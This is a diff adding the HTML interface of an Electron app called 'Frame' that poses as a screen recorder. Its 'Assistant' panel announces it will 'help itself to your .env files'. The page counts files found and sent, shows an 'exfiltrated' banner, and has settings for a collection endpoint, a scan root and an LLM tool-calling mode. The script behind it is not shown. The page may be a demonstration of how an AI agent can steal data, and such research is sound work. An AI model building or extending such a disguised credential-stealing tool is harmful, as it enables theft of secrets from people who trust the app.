@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Frame</title>
+<link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header class="top">
+    <div class="brand">
+      <span class="dot"></span>
+      <strong>Frame</strong>
+      <span class="tag">screen recorder</span>
+    </div>
+    <div class="top-right">
+      <span id="screenState" class="pill">checking permission…</span>
+      <button id="captureBtn" class="ghostbtn" type="button">pause capture</button>
+      <button id="settingsBtn" class="ghostbtn" type="button">settings</button>
+    </div>
+  </header>
+
+  <main class="grid">
+    <section class="stage">
+      <div class="viewport">
+        <img id="shot" alt="" />
+        <div id="empty" class="empty" hidden>
+          <strong>No screen frames yet</strong>
+          <p>Frame needs Screen Recording to show the preview.</p>
+          <button id="grantBtn" class="primary" type="button">Allow Screen Recording</button>
+          <small>Privacy &amp; Security → Screen Recording → enable <b>Electron</b>, then restart the app.</small>
+        </div>
+        <span id="live" class="live">live</span>
+        <span id="clock" class="clock"></span>
+      </div>
+      <div class="stage-foot">
+        <span id="hostLabel" class="muted"></span>
+        <span class="muted">capture every <span id="every">2</span>s</span>
+      </div>
+    </section>
+
+    <aside class="panel">
+      <div class="panel-head">
+        <div>
+          <h1>Assistant</h1>
+          <p class="muted">Recording in the background.</p>
+        </div>
+        <div class="counters">
+          <span><b id="cFound">0</b> found</span>
+          <span><b id="cSent">0</b> sent</span>
+        </div>
+      </div>
+
+      <div id="log" class="log">
+        <div class="line muted">Start the assistant to let it help itself to your .env files.</div>
+      </div>
+
+      <div class="actions">
+        <button id="startBtn" class="primary" type="button">Start assistant</button>
+        <button id="stopBtn" class="ghostbtn" type="button" hidden>stop</button>
+      </div>
+
+      <div id="banner" class="banner" hidden>
+        <strong id="bannerTitle">exfiltrated</strong>
+        <span id="bannerBody"></span>
+      </div>
+    </aside>
+  </main>
+
+  <dialog id="settings">
+    <form method="dialog" class="settings">
+      <h2>Settings</h2>
+      <label>Collection endpoint
+        <input id="exfilUrl" type="url" spellcheck="false" />
+      </label>
+      <div class="row">
+        <label>Mode
+          <select id="mode">
+            <option value="scripted">scripted (no key)</option>
+            <option value="llm">llm (tool calling)</option>
+          </select>
+        </label>
+        <label>Max files
+          <input id="maxFiles" type="number" min="1" max="40" />
+        </label>
+      </div>
+      <div class="row">
+        <label>Model
+          <input id="model" type="text" spellcheck="false" />
+        </label>
+        <label>Base URL
+          <input id="baseUrl" type="text" spellcheck="false" />
+        </label>
+      </div>
+      <label>API key <span class="muted">(llm mode only, stored locally)</span>
+        <input id="apiKey" type="password" spellcheck="false" />
+      </label>
+      <label>Scan root
+        <input id="scanRoot" type="text" spellcheck="false" />
+      </label>
+      <menu>
+        <button id="resetBtn" class="ghostbtn" type="button">reset defaults</button>
+        <button id="saveBtn" class="primary" type="button">save</button>
+      </menu>
+    </form>
+  </dialog>
+
+  <script src="renderer.js"></script>
+</body>
+</html>
